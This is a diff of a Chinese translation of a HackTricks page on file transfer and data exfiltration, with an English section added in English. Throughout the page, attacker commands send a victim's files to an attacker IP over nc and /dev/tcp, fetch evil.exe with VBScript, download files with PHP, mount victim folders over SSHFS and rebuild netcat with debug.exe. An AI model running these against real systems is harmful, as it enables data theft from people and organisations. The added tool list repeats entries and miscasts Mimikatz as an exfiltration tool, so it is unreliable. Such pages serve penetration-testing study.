@@ -2,29 +2,29 @@
 
 <details>
 
-<summary><strong>从零到英雄学习AWS黑客技术，参加</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
 支持HackTricks的其他方式：
 
-* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-找到对您最重要的漏洞，以便更快修复它们。Intruder追踪您的攻击面，进行主动威胁扫描，在您的整个技术栈中找到问题，从API到Web应用程序和云系统。[**今天就免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现从API到Web应用程序和云系统的整个技术堆栈中的问题。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 ***
 
-## 常见的白名单域名用于信息泄露
+## 常见的被允许传输信息的域名
 
-查看[https://lots-project.com/](https://lots-project.com/)找到可以滥用的常见白名单域名
+查看[https://lots-project.com/](https://lots-project.com/)以找到常见的被允许传输信息的域名
 
 ## 复制\&粘贴Base64
 
@@ -65,8 +65,8 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### 上传文件
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer 打印 GET 和 POST（包括头部信息）**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-* Python 模块 [uploadserver](https://pypi.org/project/uploadserver/)：
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* Python 模块 [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -122,7 +122,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### FTP服务器（python）
+### FTP服务器（Python）
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -163,7 +163,7 @@ ftp -n -v -s:ftp.txt
 ```
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-找到最重要的漏洞，以便您能更快修复它们。Intruder 跟踪您的攻击面，运行主动威胁扫描，在您的整个技术栈中找到问题，从 APIs 到 web 应用程序和云系统。今天就[**免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+找到最重要的漏洞，这样你就可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -171,14 +171,14 @@ ftp -n -v -s:ftp.txt
 
 ## SMB
 
-Kali 作为服务器
+Kali作为服务器
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-或者**使用 samba** 创建一个 smb 共享：
+或者使用samba创建一个smb共享：
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -194,6 +194,80 @@ guest ok = Yes
 service smbd restart
 ```
 Windows
+
+---
+
+## Exfiltration
+
+### Techniques
+
+1. **Exfiltration Over C2 Channel**: Utilize the command and control (C2) channel to exfiltrate data from the target network.
+
+2. **Exfiltration Over Alternative Protocol**: Use alternative protocols such as DNS, ICMP, or HTTP to exfiltrate data without being detected easily.
+
+3. **Exfiltration Over Unencrypted/Encrypted Web Protocols**: Leverage unencrypted or encrypted web protocols like HTTP or HTTPS to exfiltrate data.
+
+4. **Exfiltration Over Unencrypted/Encrypted Web Protocols Using Web Services**: Utilize web services over unencrypted or encrypted web protocols for exfiltration.
+
+5. **Exfiltration Over Unencrypted/Encrypted Web Protocols Using Web Services with Non-standard Ports**: Use non-standard ports in combination with web services over unencrypted or encrypted web protocols for exfiltration.
+
+### Tools
+
+- **PowerShell**: Use PowerShell scripts to exfiltrate data from Windows systems.
+
+- **Certutil**: Employ Certutil to decode/encode files for exfiltration.
+
+- **Bitsadmin**: Utilize Bitsadmin to download/upload files for exfiltration.
+
+- **WMIC**: Leverage WMIC for data exfiltration.
+
+- **FTP**: Use FTP for exfiltration purposes.
+
+- **BITS**: Utilize Background Intelligent Transfer Service (BITS) for data exfiltration.
+
+- **SMB**: Use Server Message Block (SMB) for exfiltration.
+
+- **RDP**: Utilize Remote Desktop Protocol (RDP) for exfiltration.
+
+- **Netsh**: Use Netsh for data exfiltration.
+
+- **Reg**: Utilize Reg commands for exfiltration.
+
+- **Schtasks**: Use Schtasks for data exfiltration.
+
+- **Vssadmin**: Utilize Vssadmin for exfiltration purposes.
+
+- **Debug.exe**: Use Debug.exe for data exfiltration.
+
+- **Powershell Empire**: Utilize PowerShell Empire for exfiltration.
+
+- **Mimikatz**: Use Mimikatz for data exfiltration.
+
+- **PsExec/PsExec64**: Utilize PsExec or PsExec64 for exfiltration.
+
+- **Bitsadmin**: Use Bitsadmin for data exfiltration.
+
+- **Certutil**: Utilize Certutil for exfiltration purposes.
+
+- **WMIC**: Use WMIC for data exfiltration.
+
+- **FTP**: Utilize FTP for exfiltration.
+
+- **BITS**: Use BITS for data exfiltration.
+
+- **SMB**: Utilize SMB for exfiltration.
+
+- **RDP**: Use RDP for data exfiltration.
+
+- **Netsh**: Utilize Netsh for exfiltration purposes.
+
+- **Reg**: Use Reg for data exfiltration.
+
+- **Schtasks**: Utilize Schtasks for exfiltration.
+
+- **Vssadmin**: Use Vssadmin for data exfiltration.
+
+- **Debug.exe**: Utilize Debug.exe for exfiltration purposes.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -209,13 +283,15 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-如果受害者有SSH，攻击者可以将受害者的目录挂载到攻击者那里。
+如果受害者有SSH，攻击者可以将受害者的目录挂载到攻击者的计算机上。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
+
+NC（Netcat）是一个强大的网络工具，可用于创建各种网络连接。它可以用于侦听端口、传输文件、执行命令等。NC可用于数据外泄，因为它可以轻松地建立与远程主机的连接，并传输数据。
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -227,14 +303,14 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### 将文件上传到受害者系统
+### 将文件上传至受害者
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-由于 **@BinaryShadow\_**
+感谢 **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -256,13 +332,13 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-如果您能向SMTP服务器发送数据，您可以使用python创建一个SMTP来接收数据：
+如果您可以将数据发送到一个SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-在XP和2003中默认情况下（在其他系统中需要在安装期间明确添加）
+在XP和2003中默认情况下（在其他系统中需要在安装过程中显式添加）
 
 在Kali中，**启动TFTP服务器**：
 ```bash
@@ -276,17 +352,21 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-在**受害者**机器上，连接到Kali服务器：
+在**受害者**中，连接到Kali服务器：
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-使用 PHP 单行代码下载文件：
+使用 PHP 一行代码下载文件：
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
+
+### VBScript Exfiltration
+
+VBScript can be used to exfiltrate data from a compromised system. This can be achieved by reading files, accessing system information, or interacting with network resources. VBScript can then encode the data and send it to an external server controlled by the attacker. This technique can be used to steal sensitive information from a target system.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -324,17 +404,17 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-这是一种在Windows 32位机器上有效的疯狂技术。其思路是使用`debug.exe`程序。它用于检查二进制文件，就像一个调试器。但它也可以从十六进制重建它们。所以我们的想法是，我们取像`netcat`这样的二进制文件。然后将其反汇编成十六进制，粘贴到受损机器上的文件中，再用`debug.exe`组装它。
+这是一种疯狂的技术，适用于 Windows 32 位机器。其思想是使用 `debug.exe` 程序。它用于检查二进制文件，就像一个调试器。但它也可以从十六进制重建它们。所以想法是我们拿二进制文件，比如 `netcat`。然后将其反汇编为十六进制，在受损机器上粘贴到一个文件中，然后用 `debug.exe` 组装它。
 
-`Debug.exe`只能组装64 kb的文件。因此我们需要使用比这更小的文件。我们可以使用upx来进一步压缩它。那么，让我们这样做：
+`Debug.exe` 只能组装 64 kb。所以我们需要使用小于该大小的文件。我们可以使用 upx 进一步压缩它。所以让我们这样做：
 ```
 upx -9 nc.exe
 ```
-现在它只有 29 kb。完美。那么现在让我们拆解它：
+现在它只有 29 kb。完美。所以现在让我们对其进行反汇编：
 ```
 wine exe2bat.exe nc.exe nc.txt
 ```
-现在我们只需将文本复制粘贴到我们的windows-shell中。它将自动创建一个名为nc.exe的文件
+现在我们只需将文本复制粘贴到我们的Windows shell中。然后它将自动创建一个名为nc.exe的文件。
 
 ## DNS
 
@@ -342,21 +422,21 @@ wine exe2bat.exe nc.exe nc.txt
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-找到最重要的漏洞，以便您能更快修复它们。Intruder 跟踪您的攻击面，运行主动威胁扫描，在您的整个技术栈中找到问题，从API到web应用程序和云系统。[**今天就免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+找到最重要的漏洞，这样您就可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今天。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 
 <details>
 
-<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为英雄</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-其他支持HackTricks的方式：
+支持HackTricks的其他方式：
 
-* 如果您想在HackTricks中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
